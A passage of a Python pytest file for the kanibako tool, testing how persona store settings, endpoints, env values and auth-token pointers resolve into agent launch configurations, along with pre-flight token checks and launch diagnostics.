        an ENV one, so a store-only value reaching ``reconcile_categories``
        is the whole point of routing it through the tier rather than a file.
        """
        from kanibako.commands.start import _persona_values_for

        persona_dir = self._store(tmp_home, env={"SOME_NEW_VAR": "brand-new"})
        target = self._target()
        _snap, rec = self._resolve(
            std, target=target,
            persona_values=_persona_values_for(self._NODE, target),
        )
        secret_mounts = [
            m for m in rec.mounts if m.category == "secret_path"
        ]
        assert [str(m.host_src) for m in secret_mounts] == [
            str(persona_dir / "token")
        ]
        # For an ``env`` entry the VAR name is ``box_dest`` and its VALUE rides
        # ``options`` (env carries no path / mount flags) — see CategoryEntry.
        assert [
            (e.box_dest, e.options) for e in rec.envs if e.category == "env"
        ] == [("SOME_NEW_VAR", "brand-new")]

    # --- display == launch ---------------------------------------------------

    def test_display_resolves_the_same_endpoint_and_model_as_the_launch(
        self, std, config_file, tmp_home,
    ):
        """``--effective`` and the launch DECISIONS read one tier, one value.

        Neither call is handed the store values: the display resolves them
        internally and the launch decisions get them from the launch's single
        read, and the two must agree.  ``model`` is the sharp end — the harness
        default is ``opus``, so a display that missed the tier would report
        ``opus`` while the launch shipped ``gemma4``.
        """
        from kanibako.commands.start import (
            _effective_behavior_for_display,
            _persona_values_for,
            _resolve_box_launch_decisions,
        )

        self._store(tmp_home)
        target = self._target()
        agent_cfg = target.generate_agent_config()   # first use: state is EMPTY

        _auth, endpoint, model = _resolve_box_launch_decisions(
            std=std,
            proj=self._proj(std),
            target=target,
            agent_name=self._NODE,
            agent_cfg=agent_cfg,
            system_settings_path=None,
            agent_cfg_path=None,
            selection_level=None,
            persona_values=_persona_values_for(self._NODE, target),
        )
        display = _effective_behavior_for_display(
            target, agent_cfg, None,
            system_settings_path=None,
            node_name=self._NODE,
        )

        assert endpoint == self._ENDPOINT
        assert model == "gemma4"
        assert display["endpoint"] == endpoint
        assert display["model"] == model

    def test_without_the_store_the_display_falls_back_to_the_harness_default(
        self, std, config_file, tmp_home,
    ):
        """The control for the test above: no store entry, no tier, ``opus``."""
        from kanibako.commands.start import _effective_behavior_for_display

        target = self._target()
        display = _effective_behavior_for_display(
            target, target.generate_agent_config(), None,
            system_settings_path=None,
            node_name=self._NODE,
        )
        assert display["model"] == "opus"
        assert not display.get("endpoint")

    # --- the reject arm contributes NOTHING ----------------------------------

    def test_a_rejected_store_contributes_nothing_and_does_not_crash(
        self, std, config_file, tmp_home,
    ):
        """No tier, no EMPTY-STRING override of the rungs below, no exception."""
        from kanibako.commands.start import (
            _effective_behavior_for_display,
            _persona_values_for,
        )

        self._store(tmp_home, config="{ not json")
        target = self._target()
        assert _persona_values_for(self._NODE, target) is None

        snap = self._snapshot(std, target=target, persona_values=None)
        active = self._active(snap)
        assert not dict.get(active, "env")
        assert not dict.get(active, "secret_path")
        # The lower rungs still resolve — emptiness never overrode them.
        display = _effective_behavior_for_display(
            target, target.generate_agent_config(), None,
            system_settings_path=None,
            node_name=self._NODE,
        )
        assert display["model"] == "opus"

    def test_the_store_read_itself_is_silent(
        self, std, config_file, tmp_home, capsys,
    ):
        """⚑ The READ says nothing; the LAUNCH speaks.

        ``_persona_bundle_for`` also rides ``stop`` and the credential watcher,
        neither of which is about the persona — a store complaint printed there
        would narrate an unrelated operation.  The diagnostics live in
        ``_warn_persona_store_diagnostics``, which only the launch calls (see
        ``TestPersonaStoreDiagnostics``).
        """
        from kanibako.commands.start import _persona_bundle_for, _persona_values_for

        self._store(tmp_home, config="{ not json")
        target = self._target()

        bundle = _persona_bundle_for(self._NODE, target)
        assert bundle is not None and bundle.reject_reason is not None
        assert _persona_values_for(self._NODE, target) is None
        assert capsys.readouterr().err == ""

    # --- a bare launch is untouched ------------------------------------------

    def test_a_bare_launch_reads_no_store_and_adds_no_tier(
        self, std, config_file, tmp_home,
    ):
        """Byte-identical: a bare agent never even opens the store."""
        from kanibako.commands.start import _persona_values_for
        from kanibako.plugins.claude.target import ClaudeTarget

        reads: list = []

        class _CountingTarget(ClaudeTarget):
            def read_persona_settings(self, config_dir):
                reads.append(config_dir)
                return super().read_persona_settings(config_dir)

        # A store entry for a DIFFERENT (persona) node exists; the bare launch
        # must not notice it.
        self._store(tmp_home)
        target = _CountingTarget()

        assert _persona_values_for("claude", target) is None
        assert reads == []

        snap = self._snapshot(std, target=target, persona_values=None)
        assert not dict.get(self._active(snap), "env")

    def test_no_target_means_no_store_read(self, std, config_file, tmp_home):
        from kanibako.commands.start import _persona_values_for

        self._store(tmp_home)
        assert _persona_values_for(self._NODE, None) is None

    # --- NEVER-PERSIST -------------------------------------------------------

    def test_a_no_reader_harness_still_resolves_its_keyspace_persona(
        self, std, config_file, tmp_home,
    ):
        """⚑ A goose-shaped persona (no reader, store dir present) still LAUNCHES.

        Its endpoint/token live in the keyspace; the store dir may exist purely
        for a ``.secret_path``.  The bundle must come back ``no_reader`` — NOT a
        reject — and the resolve must proceed, because the load-or-error gate
        treats a reject as fatal.
        """
        from kanibako.commands.start import _persona_bundle_for, _persona_values_for
        from kanibako.targets.no_agent import NoAgentTarget

        self._store(tmp_home)
        target = NoAgentTarget()

        bundle = _persona_bundle_for(self._NODE, target)
        assert bundle is not None
        assert bundle.no_reader is True
        assert bundle.reject_reason is None
        assert _persona_values_for(self._NODE, target) is None

        snap = self._snapshot(std, target=target, persona_values=None)
        assert not dict.get(self._active(snap), "env")

    def test_resolving_a_persona_writes_no_agent_settings_file(
        self, std, config_file, tmp_home,
    ):
        """⚑ NEVER-PERSIST: the agent settings file is USER-INTENT ONLY.

        Resolving the whole persona tier — read, render, snapshot, category
        reconcile — must leave ``agents/<node>/settings.yaml`` exactly as it was.
        The retired verified swap wrote endpoint/model/secret_path into it on
        every launch; nothing may write there again except a user's own
        ``config set`` and the one-time empty first-use generate.
        """
        from kanibako.commands.start import _persona_values_for
        from kanibako.settings.agent_config import agent_settings_path

        self._store(tmp_home, env={"SOME_NEW_VAR": "brand-new"})
        target = self._target()
        path = agent_settings_path(std.agents, self._NODE)

        # (a) FIRST USE — no file at all.  It must still not exist afterwards.
        assert not path.exists()
        self._resolve(
            std, target=target,
            persona_values=_persona_values_for(self._NODE, target),
        )
        assert not path.exists()

        # (b) EXISTING file — byte-identical afterwards.  The values below are
        # DELIBERATELY stale/contradictory: a surviving swap would rewrite them
        # from the store, which is exactly what this pin forbids.
        from kanibako.settings.agent_config import AgentConfig, write_agent_config

        write_agent_config(path, AgentConfig(
            state={"endpoint": "https://user-set.example", "model": "user-set"},
            secret_path={"ANTHROPIC_AUTH_TOKEN": "/user/set/tok"},
        ))
        before = path.read_bytes()
        self._resolve(
            std, target=target,
            persona_values=_persona_values_for(self._NODE, target),
        )
        assert path.read_bytes() == before

    # --- the expand() exposure (locked decision #4) ---------------------------

    _EXPAND_HAZARDS = [
        "$HOME/tok",          # a host $VAR the ctx DOES know
        "~/tok",              # tilde
        "plain-value",        # the control: nothing to expand
        "100%$",              # a bare $ with no name after it
        "a@b.example",        # an @ that is NOT a leading whole-value ref
    ]

    def _leaf_outcome(self, std, tmp_home, *, target, category, var,
                      persona_values=None, system_doc=None,
                      agent_cfg=None, agent_cfg_path=None):
        """The resolved leaf, or the EXCEPTION — an expansion defect is an outcome.

        Several hazard values legitimately RAISE out of ``expand`` (``$HOME`` is
        not in the launch ctx namespace; a bare ``$`` is malformed).  That is a
        perfectly good answer to "do the two routes behave identically" — it just
        has to be captured rather than allowed to abort the comparison.
        """
        from kanibako.commands.start import _resolve_launch_snapshot
        from kanibako.settings.config_io import dump_doc

        system_file = None
        if system_doc is not None:
            system_file = tmp_home / "sys" / "settings.yaml"
            system_file.parent.mkdir(parents=True, exist_ok=True)
            dump_doc(system_file, system_doc)
        try:
            snap, _rec = _resolve_launch_snapshot(
                std=std, proj=self._proj(std), agent_name=self._NODE,
                system_settings_path=system_file, agent_cfg_path=agent_cfg_path,
                desc=None, install=None, target=target,
                agent_cfg=agent_cfg, persona_values=persona_values,
                include_base_families=False,
            )
        except Exception as exc:
            return ("raised", type(exc).__name__, str(exc))
        return (
            "ok",
            dict.get(dict.get(self._active(snap), category) or {}, var),
        )

    # ⚑ ``$HOME/tok`` is EXCLUDED here and gets its own test below: the store's
    # ``.secret_path`` pointer is expanded by ``resolve_secret_path`` BEFORE the
    # keyspace sees it, so a ``$VAR`` in a POINTER is a documented divergence
    # rather than an expand-time equivalence.  Every other hazard shape agrees.
    @pytest.mark.parametrize("raw", [
        r for r in _EXPAND_HAZARDS if not r.startswith("$")
    ])
    def test_a_store_secret_path_expands_exactly_as_an_agent_file_one(
        self, std, config_file, tmp_home, raw,
    ):
        """⚑ Locked decision #4, the AGENT-FILE half: same leaf, two levels.

        A `$`/`@` inside a store value reaches ``expand()``.  The agent FILE has
        the identical exposure — ``_agent_partial`` re-roots the file's FLAT
        ``self.secret_path`` into the active agent level, so it is the same kind
        of snapshot leaf on the rung directly above the persona tier.  Not a
        regression, then; but the equivalence is pinned rather than assumed.

        Structurally it cannot differ once both are leaves — ``expand`` walks the
        ALREADY-MERGED snapshot and has no idea which level contributed a leaf —
        and if these ever DO diverge, the store path is the wrong one: the agent
        file is the released, user-visible behavior.
        """
        from kanibako.commands.start import _persona_values_for
        from kanibako.settings.agent_config import (
            AgentConfig,
            agent_settings_path,
            load_agent_config,
            write_agent_config,
        )

        # The store's resolved token pointer is an ABSOLUTE path, so feed *raw*
        # through both routes as the SAME literal: the store's ``.secret_path``
        # line is anchored to the persona dir, which would otherwise make the two
        # inputs differ before ``expand`` ever sees them.
        self._store(tmp_home)
        target = self._target()
        literal = f"/nonexistent/{raw}"
        (tmp_home / "config" / "personas" / "navigator" / ".secret_path").write_text(
            literal + "\n",
        )
        via_store = self._leaf_outcome(
            std, tmp_home, target=target,
            category="secret_path", var="ANTHROPIC_AUTH_TOKEN",
            persona_values=_persona_values_for(self._NODE, target),
        )

        # (b) via the agent FILE — the rung directly above it.
        path = agent_settings_path(std.agents, self._NODE)
        write_agent_config(path, AgentConfig(
            secret_path={"ANTHROPIC_AUTH_TOKEN": literal},
        ))
        via_file = self._leaf_outcome(
            std, tmp_home, target=target,
            category="secret_path", var="ANTHROPIC_AUTH_TOKEN",
            agent_cfg=load_agent_config(path), agent_cfg_path=path,
        )
        assert via_store == via_file, (
            f"store and agent-file secret_path disagree for {raw!r}: "
            f"{via_store!r} vs {via_file!r}"
        )

    def test_a_dollar_var_in_a_store_POINTER_is_expanded_before_the_keyspace(
        self, std, config_file, tmp_home, monkeypatch,
    ):
        """⚑ THE ONE DIVERGENCE, pinned deliberately — NOT an equivalence.

        A ``$VAR`` in the store's ``.secret_path`` POINTER is expanded by
        :func:`~kanibako.persona_store.resolve_secret_path` (``os.path.expandvars``
        over the PROCESS environment, then ``~``) before the value is ever a
        keyspace leaf.  The same ``$VAR`` written into the agent FILE's
        ``secret_path`` instead reaches ``expand()`` raw and is resolved — or
        REFUSED — against kanibako's own, much narrower namespace.

        So the two differ in BOTH namespace and timing, and a name like ``$HOME``
        resolves through the store while raising ``Unknown variable`` through the
        file.  That is PRE-EXISTING behavior of the pointer contract (the
        persona-grata standard specifies a host path spec, expanded host-side),
        not something the live-tier build introduced — the value the keyspace
        receives is already a literal path, so it is never double-expanded.
        Recorded here so the asymmetry is a decision on the record rather than a
        surprise; changing it is a spec question, not a code cleanup.
        """
        from kanibako.commands.start import _persona_values_for
        from kanibako.settings.agent_config import (
            AgentConfig,
            agent_settings_path,
            load_agent_config,
            write_agent_config,
        )

        monkeypatch.setenv("NAV_TOKEN_DIR", "/from/the/process/env")
        self._store(tmp_home)
        (tmp_home / "config" / "personas" / "navigator" / ".secret_path").write_text(
            "$NAV_TOKEN_DIR/tok\n",
        )
        target = self._target()
        via_store = self._leaf_outcome(
            std, tmp_home, target=target,
            category="secret_path", var="ANTHROPIC_AUTH_TOKEN",
            persona_values=_persona_values_for(self._NODE, target),
        )
        # Expanded from the PROCESS env, already a literal by snapshot time.
        assert via_store == ("ok", "/from/the/process/env/tok")

        path = agent_settings_path(std.agents, self._NODE)
        write_agent_config(path, AgentConfig(
            secret_path={"ANTHROPIC_AUTH_TOKEN": "$NAV_TOKEN_DIR/tok"},
        ))
        via_file = self._leaf_outcome(
            std, tmp_home, target=target,
            category="secret_path", var="ANTHROPIC_AUTH_TOKEN",
            agent_cfg=load_agent_config(path), agent_cfg_path=path,
        )
        # kanibako's namespace does not carry it: REFUSED, not silently wrong.
        assert via_file[0] == "raised"
        assert "NAV_TOKEN_DIR" in via_file[2]

    @pytest.mark.parametrize("raw", _EXPAND_HAZARDS)
    def test_a_store_env_value_expands_exactly_as_a_keyspace_one(
        self, std, config_file, tmp_home, raw,
    ):
        """⚑ Locked decision #4, the ENV half — against the RIGHT comparison.

        The like-for-like route for a store ``env.<VAR>`` is a keyspace-scope
        ``agent.<node>.env.<VAR>``, NOT the agent file's flat ``self.env`` table:
        ``_agent_partial`` re-roots only ``self.secret_path`` into the cascade,
        so ``self.env`` never becomes a snapshot leaf at all (it is delivered by
        the separate ``_build_config_env`` under-layer and sees no ``expand``).
        Both routes compared here DO ride the snapshot, and must agree.
        """
        from kanibako.commands.start import _persona_values_for

        self._store(tmp_home, env={"NAV_X": raw})
        target = self._target()
        via_store = self._leaf_outcome(
            std, tmp_home, target=target, category="env", var="NAV_X",
            persona_values=_persona_values_for(self._NODE, target),
        )
        via_keyspace = self._leaf_outcome(
            std, tmp_home, target=target, category="env", var="NAV_X",
            system_doc={"agent": {self._NODE: {"env": {"NAV_X": raw}}}},
        )
        assert via_store == via_keyspace, (
            f"store and keyspace env disagree for {raw!r}: "
            f"{via_store!r} vs {via_keyspace!r}"
        )

    def test_a_first_use_generated_agent_file_carries_no_persona_values(
        self, std, config_file, tmp_home,
    ):
        """The generated file is EMPTY of persona values, store or no store."""
        self._store(tmp_home)
        generated = self._target().generate_agent_config()
        assert not generated.state.get("endpoint")
        assert not generated.state.get("model")
        assert not generated.secret_path
        assert not generated.env


class TestPersonaStoreDiagnostics:
    """The launch-path printer for a bundle's SOFT diagnostics.

    ⚑ These warnings used to come out of ``_reconcile_persona_store``, which is
    deleted.  Dropping a diagnostic in the same change that removes its other
    printer is how a condition goes silent for good — so each one is pinned
    here, on the function the launch now calls.
    """

    _NODE = "navigator℘claude"

    def _warn(self, bundle):
        from kanibako.commands.start import _warn_persona_store_diagnostics

        _warn_persona_store_diagnostics(self._NODE, bundle)

    def test_a_reject_reason_is_NOT_warned_here_it_is_a_hard_error(self, capsys):
        """⚑ A reject is refused by the pre-flight, not advised about here.

        Warning AND refusing would print the same fact twice — once as advice,
        once as the refusal.  ``TestPersonaPreflightBundle`` pins the refusal and
        that it names the reader's own cause.
        """
        from kanibako.persona_store import PersonaBundle

        self._warn(PersonaBundle(reject_reason="settings.json is not valid JSON"))
        assert capsys.readouterr().err == ""

    def test_an_unresolved_token_pointer_is_reported(self, capsys):
        from kanibako.persona_store import PersonaBundle

        self._warn(PersonaBundle(
            endpoint="https://api.example", token_error="no .secret_path file",
        ))
        err = capsys.readouterr().err
        assert "token pointer did not resolve" in err
        assert "no .secret_path file" in err

    def test_undeliverable_env_values_are_named(self, capsys):
        from kanibako.persona_store import PersonaBundle

        self._warn(PersonaBundle(
            endpoint="https://api.example", env_dropped=("NAV_RETRIES", "NAV_DEBUG"),
        ))
        err = capsys.readouterr().err
        assert "NAV_RETRIES" in err and "NAV_DEBUG" in err

    def test_a_no_reader_bundle_says_nothing(self, capsys):
        """No reader = no complaint about any file; a goose persona is normal."""
        from kanibako.persona_store import PersonaBundle

        self._warn(PersonaBundle(no_reader=True))
        assert capsys.readouterr().err == ""

    def test_a_clean_bundle_says_nothing(self, capsys):
        from pathlib import Path

        from kanibako.persona_store import PersonaBundle

        self._warn(PersonaBundle(
            endpoint="https://api.example", model="gemma4",
            auth_env="ANTHROPIC_AUTH_TOKEN", token_path=Path("/tok"),
        ))
        assert capsys.readouterr().err == ""


class TestPersonaPreflightBundle:
    """The load-or-error pre-flight ON THE BUNDLE (D2).

    Three things meet here, and each is a rule rather than a detail:

    * the TOKEN resolves from TWO sources — the agent FILE rung first, the
      persona STORE below it.  Nothing persists the store any more, so without
      the second source every store-only persona would fail its own token gate;
      and with the order reversed, the gate would approve a token the cascade
      does not actually mount.
    * a ``reject_reason`` is a HARD ERROR (no last-known-good exists to keep),
      while ``no_reader`` is NOT — the whole reason D0 split them.
    * the PER-LAUNCH verify probe hard-errors on a positive auth reject, WARNS
      when it probed and could not tell (``INCONCLUSIVE``), and is SILENT when no
      probe was possible at all (``NOT_APPLICABLE``).  It is opt-in
      (``probe=True``) so the create path's separate warn-only probe is not
      unified into it.
    """

    _ENDPOINT = "https://api.navigator.example/v1"
    _NODE = "navigator℘claude"

    class _Target:
        """Duck-typed claude-shaped target with a scripted probe OUTCOME.

        *outcome* is a :class:`~kanibako.targets.base.PersonaProbeOutcome` (or an
        Exception to raise, for the never-raise contract).
        """

        name = "claude"
        descriptor = None

        def __init__(self, outcome=None):
            from kanibako.targets.base import PersonaProbeOutcome

            self.outcome = (
                PersonaProbeOutcome.passed() if outcome is None else outcome
            )
            self.calls: list = []

        def verify_persona(self, endpoint, token_path, model, *, timeout=5.0):
            self.calls.append((endpoint, token_path, model))
            if isinstance(self.outcome, Exception):
                raise self.outcome
            return self.outcome

    def _token(self, tmp_path, name="tok"):
        p = tmp_path / name
        p.write_text("sk-test\n")
        return p

    def _cfg(self, **kw):
        from kanibako.settings.agent_config import AgentConfig

        return AgentConfig(**kw)

    def _run(self, agent_cfg, *, bundle=None, probe=False, target=None,
             endpoint=None, model="gemma4"):
        from kanibako.commands.start import _preflight_persona_load
        from kanibako.log import get_logger

        return _preflight_persona_load(
            self._NODE, agent_cfg,
            self._ENDPOINT if endpoint is None else endpoint,
            get_logger("test"),
            target=target if target is not None else self._Target(),
            keyspace_model=model, bundle=bundle, probe=probe,
        )

    # --- the token gate's second source --------------------------------------

    def test_a_store_only_token_satisfies_the_gate(self, tmp_path):
        """⚑ The D1 breakage this closes: no persist, so no file token.

        A store persona's token pointer exists ONLY in the bundle.  Before the
        store became a live tier the verified swap had written it into
        ``agents/<node>/settings.yaml``, and the gate read it from there.
        """
        from kanibako.persona_store import PersonaBundle

        tok = self._token(tmp_path)
        ep, err, _prov = self._run(
            self._cfg(),
            bundle=PersonaBundle(
                endpoint=self._ENDPOINT, auth_env="ANTHROPIC_AUTH_TOKEN",
                token_path=tok,
            ),
        )
        assert err is None
        assert ep == self._ENDPOINT

    def test_the_agent_file_beats_the_store(self, tmp_path):
        """The ruled cascade order — and the order the box actually mounts in."""
        from kanibako.persona_store import PersonaBundle

        file_tok = self._token(tmp_path, "file-tok")
        store_tok = self._token(tmp_path, "store-tok")
        target = self._Target()
        _ep, err, _p = self._run(
            self._cfg(secret_path={"ANTHROPIC_AUTH_TOKEN": str(file_tok)}),
            bundle=PersonaBundle(
                endpoint=self._ENDPOINT, auth_env="ANTHROPIC_AUTH_TOKEN",
                token_path=store_tok,
            ),
            probe=True, target=target,
        )
        assert err is None
        # The probe is handed the FILE token — the one that wins the cascade.
        assert target.calls == [(self._ENDPOINT, file_tok, "gemma4")]

    def test_an_unusable_FILE_token_is_not_rescued_by_the_store(self, tmp_path):
        """⚑ The file rung wins even when it is BROKEN — so it must be reported.

        Falling back to the store here would approve a token the cascade will
        not mount: the file value still wins ``build_launch_snapshot``, so the
        box would get the broken one while the gate passed on the good one.
        """
        from kanibako.persona_store import PersonaBundle

        store_tok = self._token(tmp_path, "store-tok")
        _ep, err, _p = self._run(
            self._cfg(secret_path={"ANTHROPIC_AUTH_TOKEN": "/nonexistent/tok"}),
            bundle=PersonaBundle(
                endpoint=self._ENDPOINT, auth_env="ANTHROPIC_AUTH_TOKEN",
                token_path=store_tok,
            ),
        )
        assert err is not None
        assert "no usable auth token" in err

    def test_a_store_token_for_a_DIFFERENT_var_does_not_satisfy_the_gate(
        self, tmp_path,
    ):
        """The token must be exported as the var the harness reads."""
        from kanibako.persona_store import PersonaBundle

        tok = self._token(tmp_path)
        _ep, err, _p = self._run(
            self._cfg(),
            bundle=PersonaBundle(
                endpoint=self._ENDPOINT, auth_env="SOME_OTHER_VAR", token_path=tok,
            ),
        )
        assert err is not None

    # --- reject vs no_reader --------------------------------------------------

    def test_a_reject_reason_is_a_hard_error_naming_the_cause(self, tmp_path):
        from kanibako.persona_store import PersonaBundle

        _ep, err, _p = self._run(
            self._cfg(secret_path={"ANTHROPIC_AUTH_TOKEN": str(self._token(tmp_path))}),
            bundle=PersonaBundle(
                reject_reason="claude persona config /s/settings.json is not valid JSON",
            ),
        )
        assert err is not None
        assert "not valid JSON" in err          # the reader's OWN cause, verbatim
        assert "/s/settings.json" in err        # …naming the offending file

    def test_a_reject_refuses_even_when_the_agent_file_could_have_carried_it(
        self, tmp_path,
    ):
        """No last-known-good arm: a broken store BLOCKS, it does not degrade."""
        from kanibako.persona_store import PersonaBundle

        _ep, err, _p = self._run(
            self._cfg(
                state={"endpoint": self._ENDPOINT},
                secret_path={"ANTHROPIC_AUTH_TOKEN": str(self._token(tmp_path))},
            ),
            bundle=PersonaBundle(reject_reason="scripted reject"),
        )
        assert err is not None and "scripted reject" in err

    def test_a_no_reader_bundle_is_never_an_error(self, tmp_path):
        """⚑ D0's entire reason for existing.

        A goose-shaped persona is configured through the keyspace and may own a
        store dir purely for its ``.secret_path``.  Collapsing ``no_reader`` into
        ``reject_reason`` would refuse every one of those launches.
        """
        from kanibako.persona_store import PersonaBundle

        _ep, err, _p = self._run(
            self._cfg(secret_path={"ANTHROPIC_AUTH_TOKEN": str(self._token(tmp_path))}),
            bundle=PersonaBundle(no_reader=True),
        )
        assert err is None

    # --- the per-launch probe -------------------------------------------------

    def test_a_rejected_token_is_a_hard_error(self, tmp_path):
        target = self._Target(outcome=PersonaProbeOutcome.rejected())
        _ep, err, _p = self._run(
            self._cfg(secret_path={"ANTHROPIC_AUTH_TOKEN": str(self._token(tmp_path))}),
            probe=True, target=target,
        )
        assert err is not None
        assert "rejected the token" in err

    def test_an_INCONCLUSIVE_probe_warns_and_proceeds(self, tmp_path, capsys):
        """DESIGN §5b: a blip is not a config error; the box surfaces a real 401.

        ⚑ This is the ONE arm the warning was written for, and the fix that
        silenced the false warnings must not silence it.  The reason rides into
        the message so the user is told WHAT went unanswered.
        """
        target = self._Target(
            outcome=PersonaProbeOutcome.inconclusive("the endpoint imploded"),
        )
        ep, err, _p = self._run(
            self._cfg(secret_path={"ANTHROPIC_AUTH_TOKEN": str(self._token(tmp_path))}),
            probe=True, target=target,
        )
        assert err is None and ep == self._ENDPOINT
        err_out = capsys.readouterr().err
        assert "could not verify" in err_out
        assert "the endpoint imploded" in err_out

    def test_a_NOT_APPLICABLE_probe_is_SILENT_and_proceeds(self, tmp_path, capsys):
        """⚑ The defect this arm exists to kill.

        NOT_APPLICABLE names a VALID configuration nobody can act on.  Warning on
        it — which a single collapsed ``None`` forced — printed "could not verify
        the endpoint" on EVERY launch, forever, for a harness that simply has no
        probe.  It belongs in the log.
        """
        target = self._Target(
            outcome=PersonaProbeOutcome.not_applicable(
                "the goose harness implements no persona verify probe",
            ),
        )
        ep, err, _p = self._run(
            self._cfg(secret_path={"ANTHROPIC_AUTH_TOKEN": str(self._token(tmp_path))}),
            probe=True, target=target,
        )
        assert err is None and ep == self._ENDPOINT
        assert capsys.readouterr().err == ""

    def test_a_goose_persona_launches_without_a_warning(self, tmp_path, capsys):
        """End to end on the REAL target: goose inherits the base no-op probe.

        Goose personas are keyspace-only by design and will never have a probe,
        so the launch must be silent about it — not warn on every start.
        """
        from kanibako.plugins.goose.target import GooseTarget

        ep, err, _p = self._run(
            self._cfg(secret_path={"OPENAI_API_KEY": str(self._token(tmp_path))}),
            probe=True, target=GooseTarget(),
        )
        assert err is None and ep == self._ENDPOINT
        assert capsys.readouterr().err == ""

    def test_a_model_less_persona_IS_probed_and_a_reject_still_hard_errors(
        self, tmp_path,
    ):
        """⚑ The regression the "no model = never probe" shortcut would create.

        A persona naming no model is VALID (claude declares
        ``model_required: false``), and its endpoint may need no model — so it is
        probed with the field omitted.  If it were skipped instead, a DEAD token
        would sail past this gate and 401 inside the box.
        """
        target = self._Target(outcome=PersonaProbeOutcome.rejected())
        _ep, err, _p = self._run(
            self._cfg(secret_path={"ANTHROPIC_AUTH_TOKEN": str(self._token(tmp_path))}),
            probe=True, target=target, model=None,
        )
        assert err is not None
        assert "rejected the token" in err
        assert target.calls and target.calls[0][2] is None   # probed, no model

    def test_a_model_less_persona_that_PASSES_launches_silently(
        self, tmp_path, capsys,
    ):
        """The endpoint accepted a request naming no model: it needs none."""
        target = self._Target()
        ep, err, _p = self._run(
            self._cfg(secret_path={"ANTHROPIC_AUTH_TOKEN": str(self._token(tmp_path))}),
            probe=True, target=target, model=None,
        )
        assert err is None and ep == self._ENDPOINT
        assert capsys.readouterr().err == ""

    def test_a_model_required_answer_is_silent_and_the_launch_PROCEEDS(
        self, tmp_path, capsys,
    ):
        """The endpoint DOES want a model this persona lacks.

        Nothing was learned about the token and the harness may still supply its
        own default at runtime — so it neither blocks nor nags.
        """
        target = self._Target(
            outcome=PersonaProbeOutcome.not_applicable(
                "the endpoint requires a model in the request (HTTP 400) and "
                "the persona names none",
            ),
        )
        ep, err, _p = self._run(
            self._cfg(secret_path={"ANTHROPIC_AUTH_TOKEN": str(self._token(tmp_path))}),
            probe=True, target=target, model=None,
        )
        assert err is None and ep == self._ENDPOINT
        assert capsys.readouterr().err == ""

    def test_an_UNREACHABLE_endpoint_still_warns(self, tmp_path, capsys):
        """The real signal, through the REAL claude probe against a closed port."""
        import socket

        from kanibako.plugins.claude.target import ClaudeTarget

        sock = socket.socket()
        sock.bind(("127.0.0.1", 0))
        port = sock.getsockname()[1]
        sock.close()  # closed port -> connection refused

        ep, err, _p = self._run(
            self._cfg(secret_path={"ANTHROPIC_AUTH_TOKEN": str(self._token(tmp_path))}),
            probe=True, target=ClaudeTarget(),
            endpoint=f"http://127.0.0.1:{port}",
        )
        assert err is None and ep == f"http://127.0.0.1:{port}"
        assert "could not verify" in capsys.readouterr().err

    def test_a_passing_probe_is_silent(self, tmp_path, capsys):
        ep, err, _p = self._run(
            self._cfg(secret_path={"ANTHROPIC_AUTH_TOKEN": str(self._token(tmp_path))}),
            probe=True, target=self._Target(),
        )
        assert err is None and ep == self._ENDPOINT
        assert capsys.readouterr().err == ""

    def test_a_probe_that_raises_is_held_to_its_never_raise_contract(
        self, tmp_path, capsys,
    ):
        """A third-party plugin bug must not kill a launch."""
        target = self._Target(outcome=RuntimeError("misbehaving plugin probe"))
        ep, err, _p = self._run(
            self._cfg(secret_path={"ANTHROPIC_AUTH_TOKEN": str(self._token(tmp_path))}),
            probe=True, target=target,
        )
        # Treated as INCONCLUSIVE: a plugin bug IS an anomaly worth surfacing.
        assert err is None and ep == self._ENDPOINT
        assert "could not verify" in capsys.readouterr().err

    def test_the_probe_is_OPT_IN_so_create_does_not_inherit_it(self, tmp_path):
        """⚑ Locked ruling #2: the create path keeps its own WARN-ONLY probe.

        ``persona_create_verdict`` / ``seed_new_box`` call this with
        ``probe=False``; if the hard error leaked into them, a create with a
        rejected token would be refused instead of warned about.
        """
        target = self._Target(outcome=PersonaProbeOutcome.rejected())
        _ep, err, _p = self._run(
            self._cfg(secret_path={"ANTHROPIC_AUTH_TOKEN": str(self._token(tmp_path))}),
            probe=False, target=target,
        )
        assert err is None
        assert target.calls == []      # not probed at all

    def test_no_probe_runs_when_the_token_gate_already_failed(self, tmp_path):
        """The probe is the LAST question — never asked of a token that failed."""
        target = self._Target()
        _ep, err, _p = self._run(self._cfg(), probe=True, target=target)
        assert err is not None
        assert target.calls == []


class TestCodexDynamicTokenVarWithStore:
    """The DYNAMIC (codex) token var counted over the FILE **and** the STORE.

    codex has no fixed token var: the single configured ``secret_path`` key IS
    the ``[model_providers.<id>].env_key``.  Once the store stopped being copied
    into the agent file, "the single configured key" had to be counted over both
    sources — a store-only persona has no file key at all and would otherwise
    read as ZERO keys and be refused.

    ⚑ The three sub-case errors must stay DISTINGUISHABLE.  "The store supplies
    it" must not collapse into the ambiguous-multiple-keys arm, and the store
    genuinely CAN create ambiguity (by naming a different var than the file) —
    which is a real ambiguity and must still be reported as one.
    """

    _ENDPOINT = "https://api.navigator.example/v1"
    _NODE = "navigator℘codex"

    def _target(self):
        from kanibako.plugins.codex.target import CodexTarget

        return CodexTarget()

    def _bundle(self, tmp_path, var="NAVIGATOR_API_KEY", *, token=True):
        from kanibako.persona_store import PersonaBundle

        tok = None
        if token:
            tok = tmp_path / "store-tok"
            tok.write_text("sk-test\n")
        return PersonaBundle(
            endpoint=self._ENDPOINT, model="gemma4", auth_env=var, token_path=tok,
        )

    def _run(self, agent_cfg, bundle):
        from kanibako.commands.start import _preflight_persona_load
        from kanibako.log import get_logger

        return _preflight_persona_load(
            self._NODE, agent_cfg, self._ENDPOINT, get_logger("test"),
            target=self._target(), keyspace_model="gemma4",
            bundle=bundle, probe=False,
        )

    def _cfg(self, **kw):
        from kanibako.settings.agent_config import AgentConfig

        return AgentConfig(**kw)

    def test_a_store_only_key_resolves_the_env_key(self, tmp_path):
        """ZERO file keys + one store key = ONE key, not zero."""
        ep, err, provider = self._run(
            self._cfg(), self._bundle(tmp_path, "NAVIGATOR_API_KEY"),
        )
        assert err is None and ep == self._ENDPOINT
        # …and the provider's env_key is the STORE's var, so the generated
        # config.toml reads exactly the var kanibako exports.
        assert provider is not None
        assert provider.env_key == "NAVIGATOR_API_KEY"

    def test_the_file_key_wins_when_both_name_the_same_var(self, tmp_path):
        file_tok = tmp_path / "file-tok"
        file_tok.write_text("sk-file\n")
        ep, err, provider = self._run(
            self._cfg(secret_path={"NAVIGATOR_API_KEY": str(file_tok)}),
